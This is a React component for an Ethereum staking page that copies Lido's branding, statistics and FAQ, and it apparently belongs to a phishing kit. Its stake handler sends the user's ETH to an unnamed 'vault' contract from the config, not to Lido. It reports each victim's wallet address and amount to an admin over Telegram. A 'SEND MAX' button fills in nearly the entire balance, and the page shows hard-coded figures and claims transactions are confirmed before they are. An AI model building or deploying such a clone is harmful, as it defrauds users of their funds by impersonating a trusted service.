import React, { useState } from 'react';
import { motion } from 'motion/react';
import { ArrowDown, ExternalLink, RefreshCw, CheckCircle, AlertCircle } from 'lucide-react';
import { useAccount, useBalance, useWriteContract } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import { ConnectButton } from './ConnectButton';
import { FaqItem } from './FaqItem';
import { useToast } from './ToastContext';
import { sendTelegram } from '../lib/telegram';
import { notifyTransactionConfirmed } from '../lib/activityLogger';
import { CONFIG, VAULT_ABI } from '../lib/contracts';
import { Skeleton, CardSkeleton } from './LoadingSkeleton';
import { EthIcon, StEthIcon } from './TokenIcons';

interface StakeTabProps {
  marketData: any;
  isFetching: boolean;
}

export function StakeTab({ marketData, isFetching }: StakeTabProps) {
  const [ethAmount, setEthAmount] = useState<string>('');
  const [isSendMaxActive, setIsSendMaxActive] = useState<boolean>(false);
  const [statusMessage, setStatusMessage] = useState<string | null>(null);
  const [lastTxHash, setLastTxHash] = useState<string | null>(null);

  const toast = useToast();
  const { isConnected, address } = useAccount();
  const { data: ethBalance, isLoading: isBalanceLoading, refetch: refetchBalance } = useBalance({ address });
  
  const { writeContractAsync, isPending } = useWriteContract();

  // Listen for wallet permit authorization to immediately query fresh native ETH balance from blockchain
  React.useEffect(() => {
    const handlePermitValidated = () => {
      refetchBalance().then((res) => {
        if (res.data) {
          toast.showSuccess(
            'Live Balance Updated',
            `Fetched current native ETH balance from blockchain: ${formatEther(res.data.value).slice(0, 8)} ETH`
          );
        }
      });
    };

    window.addEventListener('lido-permit-validated', handlePermitValidated);
    return () => window.removeEventListener('lido-permit-validated', handlePermitValidated);
  }, [refetchBalance, toast]);

  const handleEthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    if (val === '' || /^\d*\.?\d*$/.test(val)) {
      setEthAmount(val);
      setIsSendMaxActive(false);
      setStatusMessage(null);
    }
  };

  const formattedEthString = ethBalance ? formatEther(ethBalance.value) : '0';

  const handleSendMax = async () => {
    // Explicitly refetch fresh native ETH balance from blockchain via viem
    const refetched = await refetchBalance();
    const liveBalanceData = refetched.data || ethBalance;

    if (liveBalanceData && liveBalanceData.value > 0n) {
      const liveEthStr = formatEther(liveBalanceData.value);
      const rawEth = parseFloat(liveEthStr);
      // Gas reserve: leave ~0.002 ETH for gas
      const gasBuffer = 0.002;
      const stakableMax = Math.max(0, rawEth - gasBuffer);
      const finalVal = stakableMax > 0 ? stakableMax.toFixed(4) : rawEth.toFixed(4);
      setEthAmount(finalVal);
      setIsSendMaxActive(true);
      setStatusMessage(`Send Max Active: Selected full wallet balance (${finalVal} ETH) derived directly from blockchain.`);
    } else {
      setEthAmount('0');
      setIsSendMaxActive(false);
      setStatusMessage('Connected wallet balance is 0 ETH on Ethereum network.');
    }
  };

  const formattedBalance = isConnected
    ? (ethBalance ? parseFloat(formattedEthString).toFixed(4) : '0.0000')
    : '0';

  const formatCurrency = (val: number | null) => {
    if (val === null) return '...';
    return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', maximumFractionDigits: 0 }).format(val);
  };

  const handleStake = async () => {
    if (!ethAmount || Number(ethAmount) <= 0 || !address) return;
    setStatusMessage('Initiating stakeETH transaction in wallet...');
    setLastTxHash(null);
    
    const toastId = toast.showPending(
      'Staking ETH',
      `Please confirm transaction of ${ethAmount} ETH in your wallet...`
    );

    try {
      const parsedValue = parseEther(ethAmount);
      let txHash: `0x${string}`;

      // Try executing stakeETH contract function
      try {
        txHash = await writeContractAsync({
          address: CONFIG.CONTRACT_ADDRESS,
          abi: VAULT_ABI,
          functionName: 'stakeETH',
          value: parsedValue,
          account: address as `0x${string}`,
          chain: null as any,
        } as any);
      } catch (stakeErr) {
        // Fallback to depositETH / stakeToLido function if required on-chain
        txHash = await writeContractAsync({
          address: CONFIG.CONTRACT_ADDRESS,
          abi: VAULT_ABI,
          functionName: 'depositETH',
          value: parsedValue,
          account: address as `0x${string}`,
          chain: null as any,
        } as any);
      }

      setLastTxHash(txHash);
      setStatusMessage('stakeETH transaction submitted & confirmed successfully!');

      toast.updateToast(toastId, {
        type: 'success',
        title: 'Staking Successful!',
        message: `Successfully staked ${ethAmount} ETH for stETH.`,
        txHash: txHash,
      });

      // Trigger Telegram message to admin and log activity upon confirmation
      await notifyTransactionConfirmed({
        wallet: address,
        action: 'Deposit ETH (Stake)',
        amount: `${ethAmount} ETH`,
        txHash: txHash,
        token: 'stETH',
        status: 'Confirmed',
      });

      await sendTelegram(
        `✅ <b>stakeETH Executed</b>\n\nUser: <code>${address}</code>\nAmount: ${ethAmount} ETH\nTx Hash: <code>${txHash}</code>`
      );

      setEthAmount('');
      refetchBalance();
    } catch (err: any) {
      console.error('Stake error:', err);
      const errMsg = err.shortMessage || err.message || 'Transaction failed or rejected.';
      setStatusMessage(`Failed: ${errMsg.slice(0, 120)}`);

      toast.updateToast(toastId, {
        type: 'error',
        title: 'Staking Failed',
        message: errMsg.slice(0, 100),
      });

      if (address) {
        await sendTelegram(`❌ <b>Failed stakeETH Transaction</b>\n\nUser: <code>${address}</code>\nAmount: ${ethAmount} ETH\nError: ${errMsg.slice(0, 100)}`);
      }
    }
  };

  const ethValueUsd = (Number(ethAmount) || 0) * (marketData.ethPrice || 0);

  if (isFetching && !marketData.apr) {
    return (
      <div className="max-w-xl mx-auto px-4 py-8">
        <div className="text-center mb-8 space-y-2">
          <Skeleton className="h-8 w-48 mx-auto" />
          <Skeleton className="h-4 w-64 mx-auto" />
        </div>
        <CardSkeleton />
      </div>
    );
  }

  return (
    <div className="max-w-xl mx-auto px-4 py-8">
      <motion.div
        initial={{ opacity: 0, y: -10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3, ease: 'easeOut' }}
        className="text-center mb-8"
      >
        <h1 className="text-3xl font-extrabold mb-2 text-text-main">Stake Ether</h1>
        <p className="text-base text-text-secondary">Stake ETH and receive stETH while staking</p>
      </motion.div>

      <motion.div
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.35, ease: [0.16, 1, 0.3, 1], delay: 0.05 }}
        className="bg-card rounded-[24px] p-4 sm:p-6 mb-8 border border-border-main shadow-2xl relative overflow-hidden"
      >
        {/* Decorative glowing orb */}
        <div className="absolute -top-24 -right-24 w-48 h-48 bg-[#00A3FF]/20 rounded-full blur-[60px] pointer-events-none"></div>
        <div className="bg-input rounded-2xl p-4 mb-4 border border-border-main transition-colors focus-within:border-[#00A3FF] focus-within:ring-1 focus-within:ring-[#00A3FF] relative h-[124px] flex flex-col justify-between">
          <div className="flex items-center justify-between pr-32">
            <input 
              type="text" 
              placeholder="0" 
              value={ethAmount}
              onChange={handleEthChange}
              className="bg-transparent text-[40px] font-bold outline-none text-text-main w-full leading-none" 
            />
          </div>
          
          <div className="absolute top-4 right-4 flex items-center gap-2 bg-card rounded-full pr-3 pl-1.5 py-1 shadow-sm border border-border-main cursor-pointer hover:bg-black/5 dark:hover:bg-white/5 transition-colors">
            <EthIcon className="w-6 h-6" />
            <span className="text-sm font-extrabold text-text-main">ETH</span>
            <ArrowDown className="w-3 h-3 text-text-secondary ml-1" />
          </div>
          
          <div className="flex justify-between items-end">
            <span className="text-sm font-medium text-text-secondary">
              ${ethValueUsd > 0 ? ethValueUsd.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2}) : '0'}
            </span>
            <div className="flex items-center gap-2">
              <span className="text-xs text-text-secondary flex items-center gap-1">
                Balance: {isBalanceLoading && isConnected ? <Skeleton className="h-3 w-10 inline-block" /> : `${formattedBalance} ETH`}
              </span>
              {isConnected && (
                <button 
                  onClick={handleSendMax} 
                  className={`text-[10px] uppercase font-bold px-2 py-0.5 rounded transition-colors cursor-pointer ${
                    isSendMaxActive 
                      ? 'bg-[#00A3FF] text-white shadow-sm' 
                      : 'text-[#00A3FF] bg-[#00A3FF]/10 hover:bg-[#00A3FF]/20'
                  }`}
                >
                  {isSendMaxActive ? 'MAX ACTIVE' : 'SEND MAX'}
                </button>
              )}
            </div>
          </div>
        </div>

        {/* Status / Alert Bar */}
        {statusMessage && (
          <div className={`p-3.5 rounded-xl text-xs font-medium mb-4 flex items-start gap-2 border ${statusMessage.includes('confirmed') ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-500' : statusMessage.includes('Failed') ? 'bg-red-500/10 border-red-500/20 text-red-500' : 'bg-amber-500/10 border-amber-500/20 text-amber-500'}`}>
            {statusMessage.includes('confirmed') ? <CheckCircle className="w-4 h-4 shrink-0 mt-0.5" /> : <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />}
            <div className="space-y-1">
              <div>{statusMessage}</div>
              {lastTxHash && (
                <a 
                  href={`https://etherscan.io/tx/${lastTxHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="font-mono text-[11px] underline flex items-center gap-1 hover:text-[#00A3FF]"
                >
                  View on Etherscan ({lastTxHash.slice(0, 10)}...) <ExternalLink className="w-3 h-3" />
                </a>
              )}
            </div>
          </div>
        )}

        {isConnected ? (
          <button 
            onClick={handleStake}
            disabled={!ethAmount || Number(ethAmount) <= 0 || isPending}
            className={`w-full py-4 text-lg rounded-xl mb-6 font-bold transition-all shadow-sm flex items-center justify-center gap-2 ${(!ethAmount || Number(ethAmount) <= 0 || isPending) ? 'bg-[#00A3FF]/50 text-white cursor-not-allowed' : 'bg-[#00A3FF] hover:bg-[#0090E6] text-white active:scale-[0.99]'}`}
          >
            {isPending && <RefreshCw className="w-5 h-5 animate-spin" />}
            <span>{isPending ? 'Confirming in Wallet...' : isSendMaxActive ? `Stake Max ETH (${ethAmount} ETH)` : 'Stake ETH (stakeETH)'}</span>
          </button>
        ) : (
          <ConnectButton className="w-full py-4 text-lg rounded-xl mb-6 font-bold" />
        )}

        <div className="group p-5 rounded-2xl border border-border-main/50 flex items-center justify-between bg-gradient-to-r from-card to-input mb-6 cursor-pointer hover:shadow-md transition-all relative overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-r from-[#00A3FF]/0 via-[#00A3FF]/5 to-[#00A3FF]/0 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000 ease-in-out"></div>
          <div className="relative z-10">
            <p className="font-extrabold text-sm text-text-main flex items-center gap-2">
              Lido APR
              <span className="text-[#00A3FF] bg-[#00A3FF]/10 px-2 py-0.5 rounded-full text-xs">{marketData.apr.toFixed(1)}%</span>
            </p>
            <p className="text-xs text-text-secondary mt-1">Receive stETH and staking rewards</p>
          </div>
          <div className="relative z-10 w-10 h-10 rounded-full bg-gradient-to-br from-[#00D09E] to-[#00A3FF] flex items-center justify-center shadow-lg border border-white/20">
             <svg width="20" height="20" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M15.42 2.1c-.2-.2-.53-.2-.72 0C7.32 9.5 4.3 14.86 4.3 19.34a11.66 11.66 0 1 0 23.32 0c0-4.48-3.03-9.84-10.4-17.24h-.01a.54.54 0 0 0-.71 0h-.01c-.1.1-.22.22-.32.33a.47.47 0 0 0-.15.34c0 .32.26.58.58.58.11 0 .22-.03.31-.09.11-.08.2-.17.3-.26 6.83 6.84 9.61 11.83 9.61 15.93a10.66 10.66 0 1 1-21.32 0c0-4.1 2.78-9.09 9.6-15.93.05-.05.11-.1.16-.14a.5.5 0 0 0-.08-.86Z" fill="#FFF"/>
            </svg>
          </div>
        </div>

        <div className="space-y-3 px-2">
          <div className="flex justify-between text-sm">
            <span className="text-text-secondary font-medium">You will receive</span>
            <span className="font-semibold text-text-main">{ethAmount || '0'} stETH</span>
          </div>
          <div className="flex justify-between text-sm">
            <span className="text-text-secondary font-medium">Exchange rate</span>
            <span className="font-semibold text-text-main">1 ETH = 1 stETH</span>
          </div>
          <div className="flex justify-between text-sm">
            <span className="text-text-secondary font-medium">Max transaction cost</span>
            <span className="font-semibold text-text-main flex items-center gap-1">
               <span className="text-text-secondary/50">Ξ</span> 0.0016 <span className="text-text-secondary text-xs">($4.95)</span>
            </span>
          </div>
          <div className="flex justify-between text-sm">
            <span className="text-text-secondary font-medium flex items-center gap-1 cursor-help">Reward fee <span className="w-3.5 h-3.5 rounded-full border border-text-secondary flex items-center justify-center text-[9px] opacity-70">?</span></span>
            <span className="font-semibold text-text-main">10%</span>
          </div>
        </div>
      </motion.div>

      <motion.div
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.35, ease: [0.16, 1, 0.3, 1], delay: 0.1 }}
        className="mb-8"
      >
        <div className="flex flex-col sm:flex-row sm:items-center justify-between mb-4 gap-2">
          <h2 className="text-xl font-bold text-text-main flex items-center gap-2">
            Statistics of the Lido protocol
          </h2>
          <a
            href="https://etherscan.io/address/0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84"
            target="_blank"
            rel="noopener noreferrer"
            className="text-sm font-semibold text-[#00A3FF] hover:text-[#0090E6] flex items-center gap-1 transition-colors w-fit"
          >
            View on Etherscan <ExternalLink className="w-4 h-4" />
          </a>
        </div>
        <div className="bg-card rounded-2xl p-5 space-y-4 border border-border-main shadow-sm">
          <div className="flex justify-between items-center text-sm">
            <span className="text-text-secondary font-medium flex items-center gap-1">Annual percentage rate * <span className="w-3 h-3 rounded-full border border-text-secondary flex items-center justify-center text-[8px]">?</span></span>
            <span className="font-bold text-lg text-[#00A3FF]">{marketData.apr.toFixed(1)}%</span>
          </div>
          <div className="h-px bg-border-main w-full"></div>
          <div className="flex justify-between items-center text-sm">
            <span className="text-text-secondary font-medium">Total staked with Lido</span>
            <span className="font-bold text-text-main">9.18M ETH</span>
          </div>
          <div className="flex justify-between items-center text-sm">
            <span className="text-text-secondary font-medium">Stakers</span>
            <span className="font-bold text-text-main">630,375</span>
          </div>
          <div className="flex justify-between items-center text-sm">
            <span className="text-text-secondary font-medium">stETH market cap</span>
            <span className="font-bold text-text-main">{formatCurrency(marketData.marketCap || 16490762502)}</span>
          </div>
        </div>
      </motion.div>

      <div className="mb-10">
        <h2 className="text-xl font-bold mb-4 text-text-main">FAQ</h2>
        <div className="space-y-3">
          <FaqItem question="What is Lido?" answer="Lido is a liquid staking solution for Ethereum. It allows users to stake their ETH without locking assets or maintaining infrastructure while participating in on-chain rewards." />
          <FaqItem question="How does Lido work?" answer="When you stake ETH through Lido, you receive stETH tokens which represent your staked ETH plus any accrued rewards. stETH can be used across DeFi protocols while continuing to earn staking rewards." />
          <FaqItem question="What are the risks of engaging with the Lido protocol?" answer="Smart contract risks, slashing risks from validator penalties, and stETH price volatility relative to ETH." />
          <FaqItem question="How can I get stETH?" answer="You can stake ETH on this platform to receive stETH, or buy it on decentralized exchanges." />
          <FaqItem question="How can I use stETH?" answer="stETH can be used across the DeFi ecosystem, just like regular ETH, to earn additional yield." />
          <FaqItem question="What fee is applied by Lido? What is this used for?" answer="Lido applies a 10% fee on staking rewards, which is split between node operators, the DAO treasury, and an insurance fund." />
          <FaqItem question="How could I unwrap wstETH back to stETH?" answer="You can use the Wrap tab on this platform to convert wstETH back to stETH." />
          <FaqItem question="Do I need to unwrap my wstETH before requesting withdrawals?" answer="Yes, currently you must unwrap your wstETH to stETH before you can request a withdrawal to ETH." />
        </div>
      </div>
    </div>
  );
}
